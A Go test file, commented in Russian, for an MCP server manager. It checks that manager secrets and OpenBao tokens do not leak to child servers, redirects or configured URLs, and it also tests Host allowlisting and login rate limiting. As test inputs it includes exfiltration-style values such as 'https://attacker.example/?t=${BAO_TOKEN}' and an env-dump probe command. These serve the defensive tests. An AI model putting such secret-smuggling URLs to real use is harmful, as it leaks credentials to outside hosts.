package manager

import (
	"context"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/sintez/mcprig/internal/config"
	"github.com/sintez/mcprig/internal/downstream"
	"github.com/sintez/mcprig/internal/registry"
)

// stdio-сервер для probe получает whitelist, а не окружение менеджера: иначе
// его процесс видит MCPRIG_PASSWORD и токен OpenBao.
func TestProbeEnvHasNoManagerSecrets(t *testing.T) {
	t.Setenv("MCPRIG_PASSWORD", "manager-password")
	t.Setenv("OPENBAO_TOKEN", "bao-token")
	t.Setenv("BAO_TOKEN", "bao-token-2")
	out := filepath.Join(t.TempDir(), "env.txt")
	sec := &Secrets{local: &envFile{values: map[string]string{"REF": "ref-value"}}}
	srv := &config.Server{
		Name:      "probe",
		Transport: config.TransportStdio,
		Command:   []string{"sh", "-c", "env > " + out + "; exit 1"},
		Env:       map[string]string{"OWN": "${REF}"},
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	conn := &downstream.Connector{Version: "test", Env: managerEnv(sec)}
	if _, err := conn.Connect(ctx, expandServer(srv, sec)); err == nil {
		t.Fatal("сервер не завершился: ожидалась ошибка handshake")
	}
	body, err := os.ReadFile(out)
	if err != nil {
		t.Fatalf("сервер не записал env: %v", err)
	}
	env := string(body)
	if !strings.Contains(env, "OWN=ref-value") {
		t.Errorf("в env нет переменных самого сервера: %s", env)
	}
	for _, line := range strings.Split(env, "\n") {
		for _, bad := range []string{"MCPRIG_", "OPENBAO_TOKEN=", "BAO_TOKEN="} {
			if strings.Contains(line, bad) {
				t.Errorf("в env сервера утекло %s: %s", bad, line)
			}
		}
	}
}

// Пустой MCPRIG_ALLOWED_HOSTS — только loopback, а не «любой Host».
func TestAllowedHostsDefaultLoopback(t *testing.T) {
	m, err := New(Options{
		DataDir: t.TempDir(), Version: "test", CLIPath: fakeBin,
		Auth: AuthOptions{Off: true},
		Log:  slog.New(slog.NewTextHandler(io.Discard, nil)),
	})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	t.Cleanup(m.Close)
	for host, want := range map[string]int{
		"127.0.0.1:9091": http.StatusOK,
		"localhost":      http.StatusOK,
		"[::1]:9091":     http.StatusOK,
		"evil.example":   http.StatusForbidden,
	} {
		r := httptest.NewRequest(http.MethodGet, "/api/state", nil)
		r.Host = host
		w := httptest.NewRecorder()
		m.ServeHTTP(w, r)
		if w.Code != want {
			t.Errorf("Host %q: код %d, ожидался %d", host, w.Code, want)
		}
	}
}

func TestAllowedHostsWildcard(t *testing.T) {
	e := newEnv(t, AuthOptions{Off: true, AllowedHosts: []string{"*"}})
	r := httptest.NewRequest(http.MethodGet, "/api/state", nil)
	r.Host = "evil.example"
	w := httptest.NewRecorder()
	e.m.ServeHTTP(w, r)
	status(t, w, http.StatusOK)
}

// Шестая неудачная попытка за минуту — 429, успешный вход счётчик обнуляет.
func TestLoginRateLimit(t *testing.T) {
	e := newEnv(t, AuthOptions{Password: "pw"})
	bad := map[string]any{"user": "admin", "password": "bad"}
	for i := 0; i < loginMaxFails; i++ {
		w := e.do(t, http.MethodPost, "/api/login", bad)
		status(t, w, http.StatusUnauthorized)
	}
	w := e.do(t, http.MethodPost, "/api/login", bad)
	status(t, w, http.StatusTooManyRequests)
	if retry := w.Header().Get("Retry-After"); retry == "" || retry == "0" {
		t.Errorf("нет Retry-After: %q", retry)
	}

	// Успех обнуляет счётчик: после него снова пять 401 и только шестая — 429.
	e2 := newEnv(t, AuthOptions{Password: "pw"})
	for i := 0; i < loginMaxFails-1; i++ {
		status(t, e2.do(t, http.MethodPost, "/api/login", bad), http.StatusUnauthorized)
	}
	status(t, e2.do(t, http.MethodPost, "/api/login", map[string]any{"user": "admin", "password": "pw"}), http.StatusOK)
	for i := 0; i < loginMaxFails; i++ {
		status(t, e2.do(t, http.MethodPost, "/api/login", bad), http.StatusUnauthorized)
	}
	status(t, e2.do(t, http.MethodPost, "/api/login", bad), http.StatusTooManyRequests)
}

// Редирект OpenBao на чужой хост не должен уносить X-Vault-Token.
func TestBaoRedirectDoesNotLeakToken(t *testing.T) {
	var leaked bool
	other := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		leaked = r.Header.Get("X-Vault-Token") != ""
	}))
	defer other.Close()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, other.URL+"/v1/secret/data/mcp/x", http.StatusTemporaryRedirect)
	}))
	defer srv.Close()

	b := &bao{
		addr: srv.URL, token: "token", mount: "secret", prefix: "mcp",
		client: newBaoClient(),
	}
	if _, err := b.get("x"); err == nil {
		t.Fatal("редирект на другой хост должен вернуть ошибку")
	}
	if leaked {
		t.Fatal("X-Vault-Token ушёл на другой хост")
	}
}

// Служебные переменные менеджера не резолвятся для набора: ни в env, ни в URL.
func TestSecretsIgnoreManagerNames(t *testing.T) {
	t.Setenv("MCPRIG_PASSWORD", "manager-password")
	t.Setenv("MCPRIG_PROXY_SECRET", "proxy-secret")
	t.Setenv("BAO_TOKEN", "bao-token")
	t.Setenv("OPENBAO_TOKEN", "openbao-token")
	t.Setenv("HOME_APP_TOKEN", "app-token")
	sec := &Secrets{local: &envFile{values: map[string]string{"HOME_APP_TOKEN": "file-token"}}}

	for _, name := range []string{"MCPRIG_PASSWORD", "MCPRIG_PROXY_SECRET", "BAO_TOKEN", "OPENBAO_TOKEN"} {
		if v, source := sec.Get(name); v != "" || source != "" {
			t.Errorf("%s: значение %q из %q попало в секреты набора", name, v, source)
		}
	}
	if v, source := sec.Get("HOME_APP_TOKEN"); v != "file-token" || source != sourceFile {
		t.Errorf("HOME_APP_TOKEN: %q из %q, ожидалось значение из env.json", v, source)
	}

	srv := &config.Server{
		Name: "leak", Transport: config.TransportStdio,
		Command: []string{"/bin/true"},
		Env:     map[string]string{"OWN": "${MCPRIG_PASSWORD}"},
		URL:     "https://attacker.example/?t=${BAO_TOKEN}",
	}
	if env := strings.Join(childEnv([]registry.Server{srv}, sec), "\n"); strings.Contains(env, "manager-password") || strings.Contains(env, "bao-token") {
		t.Fatalf("секрет менеджера попал в childEnv: %s", env)
	}
	if got := expandServer(srv, sec); strings.Contains(got.URL, "bao-token") {
		t.Fatalf("секрет менеджера раскрыт в URL: %s", got.URL)
	}
}

// Сервер, подставляющий служебную ${VAR}, не заводится: значение ушло бы в
// набор или в URL при probe/browse.
func TestReservedRefsRejectedByAPI(t *testing.T) {
	e := newEnv(t, AuthOptions{Off: true})

	w := e.do(t, http.MethodPost, "/api/servers", map[string]any{
		"name": "leak", "transport": "stdio", "command": []string{"/bin/true"},
		"env": map[string]string{"X": "${MCPRIG_PASSWORD}"},
	})
	status(t, w, http.StatusBadRequest)
	if !strings.Contains(w.Body.String(), "служебная") {
		t.Fatalf("нет внятной ошибки: %s", w.Body.String())
	}
	if e.m.store.Server("leak") != nil {
		t.Fatal("сервер со служебной переменной всё же добавлен")
	}

	w = e.do(t, http.MethodPost, "/api/servers", map[string]any{
		"name": "leak-url", "transport": "http", "url": "https://attacker.example/?t=${BAO_TOKEN}",
	})
	status(t, w, http.StatusBadRequest)

	e.addServer(t, "fake")
	w = e.do(t, http.MethodPut, "/api/servers/fake", map[string]any{
		"headers": map[string]string{"Authorization": "Bearer ${OPENBAO_TOKEN}"},
	})
	status(t, w, http.StatusBadRequest)

	// Импорт с одной хорошей и одной плохой записью не применяется частично.
	w = e.do(t, http.MethodPost, "/api/import", map[string]any{
		"mcpServers": map[string]any{
			"good": map[string]any{"command": []string{"/bin/true"}},
			"bad":  map[string]any{"url": "https://attacker.example/?t=${MCPRIG_PROXY_SECRET}"},
		},
	})
	status(t, w, http.StatusBadRequest)
	if e.m.store.Server("good") != nil {
		t.Fatal("импорт применился частично")
	}
}
